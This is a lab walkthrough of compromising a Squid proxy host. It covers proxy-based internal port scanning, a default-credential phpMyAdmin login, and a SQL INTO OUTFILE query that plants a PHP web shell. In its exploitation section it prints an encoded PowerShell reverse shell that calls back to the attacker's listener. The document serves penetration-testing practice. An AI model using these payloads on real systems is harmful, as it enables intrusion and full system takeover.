<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 192.168.53.189 -T4 -v -Pn

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/squid]
└─$ sudo nmap -A 192.168.53.189 -T4  -v -Pn -oN squid 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 03:15 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:15
Completed NSE at 03:15, 0.00s elapsed
Initiating NSE at 03:15
Completed NSE at 03:15, 0.00s elapsed
Initiating NSE at 03:15
Completed NSE at 03:15, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 03:15
Completed Parallel DNS resolution of 1 host. at 03:15, 0.01s elapsed
Initiating SYN Stealth Scan at 03:15
Scanning 192.168.53.189 [1000 ports]
SYN Stealth Scan Timing: About 29.70% done; ETC: 03:17 (0:01:13 remaining)
Discovered open port 3128/tcp on 192.168.53.189
Completed SYN Stealth Scan at 03:16, 66.96s elapsed (1000 total ports)
Initiating Service scan at 03:16
Scanning 1 service on 192.168.53.189
Completed Service scan at 03:16, 11.71s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 192.168.53.189
Retrying OS detection (try #2) against 192.168.53.189
Initiating Traceroute at 03:16
Completed Traceroute at 03:16, 0.18s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 03:16
Completed Parallel DNS resolution of 2 hosts. at 03:16, 0.01s elapsed
NSE: Script scanning 192.168.53.189.
Initiating NSE at 03:16
Completed NSE at 03:17, 20.89s elapsed
Initiating NSE at 03:17
Completed NSE at 03:17, 0.76s elapsed
Initiating NSE at 03:17
Completed NSE at 03:17, 0.00s elapsed
Nmap scan report for 192.168.53.189
Host is up (0.17s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.14
|_http-server-header: squid/4.14
|_http-title: ERROR: The requested URL could not be retrieved
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|general purpose
Running (JUST GUESSING): AVtech embedded (87%), Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%), Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental

TRACEROUTE (using port 3128/tcp)
HOP RTT       ADDRESS
1   171.38 ms 192.168.49.1
2   171.37 ms 192.168.53.189

NSE: Script Post-scanning.
Initiating NSE at 03:17
Completed NSE at 03:17, 0.00s elapsed
Initiating NSE at 03:17
Completed NSE at 03:17, 0.00s elapsed
Initiating NSE at 03:17
Completed NSE at 03:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.25 seconds
           Raw packets sent: 2104 (97.712KB) | Rcvd: 34 (1.620KB)
```
From our scan we can see only one open port, port 3128 which runs http-proxy. So, our enumeration will be focused on this one port.



<h2>Enumeration </h2>

Going to the webpage you get this

![image](https://user-images.githubusercontent.com/67879936/222615285-3794d998-7b9f-4e0d-a3a2-aa830a61c70a.png)

Okay, we got this error page. Lets try to fuxx for hidden directories using ffuf

>command: ffuf -u "http://192.168.53.189:3128/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup


```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ ffuf -u "http://192.168.53.189:3128/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.53.189:3128/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [32298/32298] :: Job [1/1] :: 115 req/sec :: Duration: [0:04:44] :: Errors: 0 ::

```
oops, we got nothing.

We can leverage squid by scanning the internal opened ports on the target. For this I'll be using a tool called spose

Link:https://github.com/aancw/spose.git

Clone this repo then run the .py file

>command: python spose.py --proxy http://192.168.53.189:3128/ --target 192.168.53.189

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/squid]
└─$ git clone https://github.com/aancw/spose.git
Cloning into 'spose'...
remote: Enumerating objects: 11, done.
remote: Total 11 (delta 0), reused 0 (delta 0), pack-reused 11
Receiving objects: 100% (11/11), done.
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/squid]
└─$ cd spose                                         
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/…/PG/pg_practice/squid/spose]
└─$ python spose.py --proxy http://192.168.53.189:3128/ --target 192.168.53.189
Using proxy address http://192.168.53.189:3128/
192.168.53.189 3306 seems OPEN 
192.168.53.189 8080 seems OPEN 
```
Looks like we have 2 internal ports running, ```port 3306``` and ```port 8080```. Lets try to access these internal ports using a tool called foxy proxy

>FoxyProxy is a browser extension that allows users to manage and switch between multiple proxy servers easily. It is available as an add-on for popular web browsers such as Google Chrome and Mozilla Firefox.

To use this, download the extension for your preferred browser

![image](https://user-images.githubusercontent.com/67879936/222622484-18cd8bb2-6eca-4924-90a3-fcd0b66b0383.png)

So, we'll be using the machine's IP address and the port that runs squid here

![image](https://user-images.githubusercontent.com/67879936/222622876-fa8eed04-7776-4ff2-918c-dfd29a83d11e.png)

Lets go ahead and save that, now that we've done that we can now access ```port 8080``` by going to this link

Link:http://127.0.0.1:8080

![image](https://user-images.githubusercontent.com/67879936/222623294-2946d97d-0175-428a-a16f-0560a0fb9cca.png)

![image](https://user-images.githubusercontent.com/67879936/222623692-51f4847c-2a1a-4fd7-adac-0157bd659189.png)

Clicking on phpmyadmin should get us this login page

![image](https://user-images.githubusercontent.com/67879936/222623921-a105a10c-6f53-4d27-9171-5f81b377334b.png)

I went ahead to look for default creds and I found one

```username:root```         ```password:(will blank)```

![image](https://user-images.githubusercontent.com/67879936/222624155-bdad871d-033a-4df1-bd7f-e9b4107ef8de.png)

cool, we are logged in already. It's time to exploit



<h2>Exploitation</h2>

Looking around the webpage I found a place where we could run sql queries

![image](https://user-images.githubusercontent.com/67879936/222626469-140c476b-846d-41bd-bd80-326dd518d6bf.png)

This is what we'll exploit. We'll try to upload a shell here

But before that, lets try to run a simple sql command there

sql query:```SELECT * FROM user;```

![image](https://user-images.githubusercontent.com/67879936/222626821-915525d6-ce2f-4945-84e5-86bbc24aab36.png)

cool, it got executed successfully. Now lets proceed

sql query:```SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\wampp\www\shell.php""```

![image](https://user-images.githubusercontent.com/67879936/222627883-22655c50-d866-4896-9a31-8e6a7eaadf64.png)

Now, to access this uploaded shell. Navigate to

Link:http://127.0.0.1:8080/shell.php?cmd=whoami

![image](https://user-images.githubusercontent.com/67879936/222628257-ef604878-abe2-40c3-8fd9-531f7b41d3aa.png)

cool, we got a response. Now lets upload a shell so we can get a shell back to our machine

payload:```powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADUAMwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D```

Note: You can't use same payload I used because it is encoded in base64 and also url encoded, You can generate yours from https://www.revshells.com/

Link:http://127.0.0.1:8080/shell.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADUAMwAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D

Before navigating ensure your netcat listener is active

>command: rlwrap nc -nvlp 4444

![image](https://user-images.githubusercontent.com/67879936/222631575-50f17c98-f9ed-4b0a-95ab-b3fdc3976a13.png)

Boom!!! We got a shell as ```nt authority\system``` the highest level of privilege on a windows machine.

That will be all for today



















